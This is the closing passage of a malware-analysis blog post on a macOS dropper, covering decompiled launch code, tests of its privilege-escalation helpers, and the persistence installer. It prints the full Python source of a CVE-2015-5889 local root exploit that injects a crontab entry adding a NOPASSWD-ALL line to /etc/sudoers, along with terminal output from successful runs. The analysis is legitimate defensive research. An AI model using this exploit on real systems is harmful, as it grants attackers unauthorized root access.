</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>NSString</span> <span class=o>*</span><span class=n>helperPath</span> <span class=o>=</span> <span class=p>[</span><span class=n>GIPath</span> <span class=n>trampoline</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>fm</span> <span class=nl>setAttributes</span><span class=p>:</span><span class=n>attr</span> <span class=nl>ofItemAtPath</span><span class=p>:</span><span class=n>helperPath</span> <span class=nl>error</span><span class=p>:</span><span class=n>nil</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NSTask</span> <span class=o>*</span><span class=n>task</span> <span class=o>=</span> <span class=p>[[</span><span class=n>NSTask</span> <span class=n>alloc</span><span class=p>]</span> <span class=n>init</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=c1>// returns path to extracted zip payload + helper
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>NSString</span> <span class=o>*</span><span class=n>launchPath</span> <span class=o>=</span> <span class=p>[</span><span class=n>GIPath</span> <span class=n>trampoline</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=nl>setLaunchPath</span><span class=p>:</span><span class=n>launchPath</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// returns path to extracted zip payload + installer
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>NSString</span> <span class=o>*</span><span class=n>installerPath</span> <span class=o>=</span> <span class=p>[</span><span class=n>GIPath</span> <span class=n>installer</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1>// returns path to extracted zip payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>NSString</span> <span class=o>*</span><span class=n>payloadPath</span> <span class=o>=</span> <span class=p>[</span><span class=n>GIPath</span> <span class=n>expandedPayload</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>NSArray</span> <span class=o>*</span><span class=n>args</span> <span class=o>=</span> <span class=p>[</span><span class=n>NSArray</span> <span class=nl>arrayWithObjects</span><span class=p>:</span><span class=n>installerPath</span><span class=p>,</span> <span class=n>payloadPath</span><span class=p>,</span> <span class=n>nil</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=nl>setArguments</span><span class=p>:</span><span class=n>args</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=n>launch</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=n>waitUntilExit</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>status</span> <span class=o>=</span> <span class=p>[</span><span class=n>task</span> <span class=n>terminationStatus</span><span class=p>];</span>
</span></span></code></pre></div><p>The <code>helper</code> binary is called with arguments <code>/Users/username/Library/Caches/org.logind.ctp.archive/installer</code> (part of the extracted payload) and <code>/Users/username/Library/Caches/org.logind.ctp.archive</code> (the extracted payload folder path). The original exploit requires the target file, this version just the path.</p><p>With this information we can test the <code>helper</code> binary in a vulnerable virtual machine:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./helper /bin/sleep /tmp/
</span></span><span class=line><span class=cl>$ ls -la /tmp/sleep 
</span></span><span class=line><span class=cl>-rwsrwsrwx  <span class=m>1</span> root  wheel  <span class=m>14080</span> Sep <span class=m>28</span> 05:24 /tmp/sleep
</span></span></code></pre></div></div></div><br><p>But if we execute it in a non-vulnerable macOS version:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./helper /bin/sleep /tmp/
</span></span><span class=line><span class=cl>2020-09-28 05:26:48.452 helper<span class=o>[</span>2234:193615<span class=o>]</span> <span class=c1>### No entitlement for SystemAdministration !!!</span>
</span></span><span class=line><span class=cl>2020-09-28 05:26:48.460 helper<span class=o>[</span>2234:193620<span class=o>]</span> <span class=c1>### syncProxyWithSemaphore error:Error Domain=NSCocoaErrorDomain Code=4097 &#34;connection to service named com.apple.systemadministration.writeconfig&#34; UserInfo={NSDebugDescription=connection to service named com.apple.systemadministration.writeconfig}</span>
</span></span></code></pre></div></div></div><br><p>If the exploit fails we get a prompt to insert the password aka <code>do_ask_user_permission</code> is executed:</p><p><img loading=lazy src=/images/2020/09/askuserperm.png#center alt="ask user permission"></p><p>But in this case the argument logic is a bit different. The first argument is the target binary to modify permissions (the exploit instead makes a copy and then modifies the permissions in the copy).</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cp /bin/sleep /tmp
</span></span><span class=line><span class=cl>$ ls -la /tmp/sleep 
</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> reverser  wheel  <span class=m>18080</span> Sep <span class=m>28</span> 18:39 sleep
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ./helper_patched /tmp/sleep /tmp
</span></span><span class=line><span class=cl><span class=o>(</span>Insert password interruption...clicky click<span class=o>)</span>
</span></span><span class=line><span class=cl>$ ls -la /tmp/sleep
</span></span><span class=line><span class=cl>-rwsrwsrwx  <span class=m>1</span> root      wheel  <span class=m>18080</span> Sep <span class=m>28</span> 18:39 sleep
</span></span></code></pre></div></div></div><br><p>In this case I patched <code>helper_patched</code> to bypass the <code>do_assistive_copy</code> exploit and go directly to the <code>do_ask_user_permission</code> method. The patch is just remove the call and replace with code to set <code>eax</code> to 1.</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:10000242C E8 3F 00 00 00    call    _do_assistive_copy ; 0 on success, 1 on failure
</span></span><span class=line><span class=cl>__text:100002431 48 8B 4D B8       mov     rcx, [rbp+var_48]
</span></span><span class=line><span class=cl>__text:100002435 89 01             mov     [rcx], eax      
</span></span></code></pre></div></div></div><br><p>In a vulnerable system the exploit will make <code>/Users/username/Library/Caches/org.logind.ctp.archive/installer</code> binary SUID root so it can run with higher privileges for persistence installation purposes.</p><p>This binary has the same name as the initial dropper but it&rsquo;s a stripped down version (no unzip capabilities, no anti-debugging/anti-vm, no exploit usage) used to install system persistence.</p><p>Let&rsquo;s continue analysis of the other exploits.</p><p>The <code>launchNewStyle</code> method will try to execute the <code>helper2</code> exploit. The exploit is the following Python script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># CVE-2015-5889: issetugid() + rsh + libmalloc osx local root</span>
</span></span><span class=line><span class=cl><span class=c1># tested on osx 10.9.5 / 10.10.5</span>
</span></span><span class=line><span class=cl><span class=c1># jul/2015</span>
</span></span><span class=line><span class=cl><span class=c1># by rebel</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span><span class=o>,</span><span class=nn>time</span><span class=o>,</span><span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sys</span> <span class=kn>import</span> <span class=n>argv</span>
</span></span><span class=line><span class=cl><span class=n>script</span><span class=p>,</span> <span class=n>param</span> <span class=o>=</span> <span class=n>argv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>env</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>stat</span><span class=p>(</span><span class=s2>&#34;/etc/sudoers&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>st_size</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>env</span><span class=p>[</span><span class=s1>&#39;MallocLogFile&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;/etc/crontab&#39;</span>
</span></span><span class=line><span class=cl><span class=n>env</span><span class=p>[</span><span class=s1>&#39;MallocStackLogging&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;yes&#39;</span>
</span></span><span class=line><span class=cl><span class=n>env</span><span class=p>[</span><span class=s1>&#39;MallocStackLoggingDirectory&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;a</span><span class=se>\n</span><span class=s1>* * * * * root echo &#34;ALL ALL=(ALL) NOPASSWD: ALL&#34; &gt;&gt; /etc/sudoers</span><span class=se>\n\n\n\n\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#sys.stderr.write(&#34;creating /etc/crontab..&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>fork</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>p</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>      
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>close</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>close</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>execve</span><span class=p>(</span><span class=s2>&#34;/usr/bin/rsh&#34;</span><span class=p>,[</span><span class=s2>&#34;rsh&#34;</span><span class=p>,</span><span class=s2>&#34;localhost&#34;</span><span class=p>],</span><span class=n>env</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s2>&#34;NOPASSWD&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/etc/crontab&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;failed</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#sys.stderr.write(&#34;done\nwaiting for /etc/sudoers to change (&lt;60 seconds)..&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>os</span><span class=o>.</span><span class=n>stat</span><span class=p>(</span><span class=s2>&#34;/etc/sudoers&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>st_size</span> <span class=o>==</span> <span class=n>s</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=c1>#       sys.stderr.write(&#34;.&#34;)   </span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#sys.stderr.write(&#34;\ndone\n&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>my_command</span> <span class=o>=</span> <span class=s2>&#34;sudo chmod 06777 </span><span class=si>%s</span><span class=s2> &amp; sudo chown root:wheel </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>param</span><span class=p>,</span> <span class=n>param</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>my_command</span><span class=p>)</span>
</span></span></code></pre></div><p>The exploit argument is the target to modify to SUID root if exploit is successful. In this case it will be the <code>installer</code> binary inside the extracted payload, as the previous exploit.</p><p>If the exploit was successful, the method will return one, zero otherwise.</p><p>Running against Mountain Lion 10.8.5 system:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cp /bin/sleep /tmp
</span></span><span class=line><span class=cl>$ ls -la /tmp/sleep 
</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> reverser  wheel  <span class=m>14080</span> Sep <span class=m>28</span> 19:45 /tmp/sleep
</span></span><span class=line><span class=cl>$ python helper2 /tmp/sleep 
</span></span><span class=line><span class=cl>failed
</span></span></code></pre></div></div></div><br><p>Running against a vulnerable Mavericks 10.9.5 system:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cp /bin/sleep /tmp
</span></span><span class=line><span class=cl>$ ls -la /tmp/sleep 
</span></span><span class=line><span class=cl>-rwxr-xr-x  <span class=m>1</span> reverser  wheel  <span class=m>14080</span> Sep <span class=m>28</span> 19:47 /tmp/sleep
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ python helper2 /tmp/sleep
</span></span><span class=line><span class=cl><span class=o>(</span><span class=nb>wait</span> a minute <span class=k>for</span> next crontab execution<span class=o>)</span>
</span></span><span class=line><span class=cl>$ ls -la /tmp/sleep 
</span></span><span class=line><span class=cl>-rwsrwsrwx  <span class=m>1</span> root  wheel  <span class=m>14080</span> Sep <span class=m>28</span> 19:47 /tmp/sleep
</span></span></code></pre></div></div></div><br><p>The exploit leaves (too many) traces in the target system and no code (as far as I can see) exists to clean it up:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>bash</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo tail /etc/sudoers 
</span></span><span class=line><span class=cl><span class=c1># %wheel    ALL=(ALL) NOPASSWD: ALL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Samples</span>
</span></span><span class=line><span class=cl><span class=c1># %users  ALL=/sbin/mount /cdrom,/sbin/umount /cdrom</span>
</span></span><span class=line><span class=cl><span class=c1># %users  localhost=/sbin/shutdown -h now</span>
</span></span><span class=line><span class=cl>ALL <span class=nv>ALL</span><span class=o>=(</span>ALL<span class=o>)</span> NOPASSWD: ALL
</span></span><span class=line><span class=cl>ALL <span class=nv>ALL</span><span class=o>=(</span>ALL<span class=o>)</span> NOPASSWD: ALL
</span></span><span class=line><span class=cl>ALL <span class=nv>ALL</span><span class=o>=(</span>ALL<span class=o>)</span> NOPASSWD: ALL
</span></span><span class=line><span class=cl>ALL <span class=nv>ALL</span><span class=o>=(</span>ALL<span class=o>)</span> NOPASSWD: ALL
</span></span><span class=line><span class=cl>ALL <span class=nv>ALL</span><span class=o>=(</span>ALL<span class=o>)</span> NOPASSWD: ALL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo tail /etc/crontab
</span></span><span class=line><span class=cl><span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>rlogin(876,0x7fff7a2c4310) malloc: stack logs being written into /tmp/stack-logs.876.1002df000.rlogin.Ers4v2.index
</span></span></span><span class=line><span class=cl><span class=s1>rlogin(876,0x7fff7a2c4310) malloc: recording malloc and VM allocation stacks to disk using standard recorder
</span></span></span><span class=line><span class=cl><span class=s1>rlogin(876,0x7fff7a2c4310) malloc: stack logs deleted from /tmp/stack-logs.876.1002df000.rlogin.Ers4v2.index
</span></span></span><span class=line><span class=cl><span class=s1>rlogin(1038,0x7fff7a2c4310) malloc: MallocStackLoggingDirectory env var set to unwritable path &#39;</span>a
</span></span><span class=line><span class=cl>* * * * * root <span class=nb>echo</span> <span class=s2>&#34;ALL ALL=(ALL) NOPASSWD: ALL&#34;</span> &gt;&gt; /etc/sudoers
</span></span></code></pre></div></div></div><br><p>There are no references to <code>helper3</code> exploit, so it might have been packaged by mistake or waiting for updated dropper, or just a replacement for <code>helper2</code> exploit.</p><p>This ends up the analysis of <code>executeTrampoline</code> method called from <code>applicationDidFinishLaunching</code>.</p><p>The next method is <code>-[appAppDelegate installPayload]</code>. If everything went as expected up to this moment, the dropper was able to extract its payload to <code>/Users/username/Library/Caches/org.logind.ctp.archive/</code> folder and managed to set the <code>installer</code> binary SUID root. The <code>-[appAppDelegate installPayload]</code> method will just execute the SUID binary responsible for persistence installation.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>har</span> <span class=kr>__cdecl</span> <span class=o>-</span><span class=p>[</span><span class=n>appAppDelegate</span> <span class=n>installPayload</span><span class=p>](</span><span class=n>appAppDelegate</span> <span class=o>*</span><span class=n>self</span><span class=p>,</span> <span class=n>SEL</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>NSTask</span> <span class=o>*</span><span class=n>v2</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>NSTask</span> <span class=o>*</span><span class=n>v3</span><span class=p>;</span> <span class=c1>// r14
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>id</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>id</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// rbx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>sleep</span><span class=p>(</span><span class=mi>2u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// NSTask *task = [[NSTask alloc] init];
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>v2</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span><span class=o>&amp;</span><span class=n>OBJC_CLASS___NSTask</span><span class=p>,</span> <span class=s>&#34;alloc&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span> <span class=s>&#34;init&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// retrieve path to SUID binary: /Users/username/Library/Caches/org.logind.ctp.archive/installer
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>v4</span> <span class=o>=</span> <span class=o>+</span><span class=p>[</span><span class=n>GIPath</span> <span class=n>installer</span><span class=p>](</span><span class=o>&amp;</span><span class=n>OBJC_CLASS___GIPath</span><span class=p>,</span> <span class=s>&#34;installer&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=nf>objc_retainAutoreleasedReturnValue</span><span class=p>(</span><span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// set the binary to execute
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s>&#34;setLaunchPath:&#34;</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>objc_release</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// execute the binary
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s>&#34;launch&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// wait for its exit
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s>&#34;waitUntilExit&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>LOBYTE</span><span class=p>(</span><span class=n>v5</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s>&#34;terminationStatus&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>objc_release</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=kt>char</span><span class=p>)</span><span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As I wrote before, this <code>installer</code> is kind of a stripped down version of the dropper. Its hash is <code>ac414a14464bf38a59b8acdfcdf1c76451c2d79da0b3f2e53c07ed1c94aeddcd</code>.</p><p>The last method to be executed by the dropper is <code>-[appAppDelegate removeTraces]</code>. It simply removes the decrypted zip file, the extracted payload folder, and the malicious application where the dropper was executed from. This will be executed whether <code>installPayload</code> is successful or not.</p><p>This closes the analysis of the main dropper binary. Next is the SUID <code>installer</code> to understand the persistence operations. That&rsquo;s chapter 2.</p><p>Have fun,<br>fG!</p><p>P.S.: Sorry for the ugly code highlighting, I need to customize a better theme.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://reverse.put.as/tags/malware/>malware</a></li></ul><nav class=paginav><a class=prev href=https://reverse.put.as/2021/03/11/hugo-githubactions/><span class=title>Â« Prev</span><br><span>How to use GitHub Actions and private repositories to deploy a Hugo static site</span></a>
<a class=next href=https://reverse.put.as/2020/09/17/evilquest-revisited/><span class=title>Next Â»</span><br><span>Is macOS under the biggest malware attack ever?</span></a></nav></footer></article></main><footer class=footer><span>Â© 2024 fG!</span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script defer crossorigin=anonymous src=/assets/js/papermod.97759987b29d428ec5fcba6e62472b585cba7bdbc1ff9ecf60b0b464d775831c.js integrity="sha256-l3WZh7KdQo7F/LpuYkcrWFy6e9vB/57PYLC0ZNd1gxw="></script></body></html>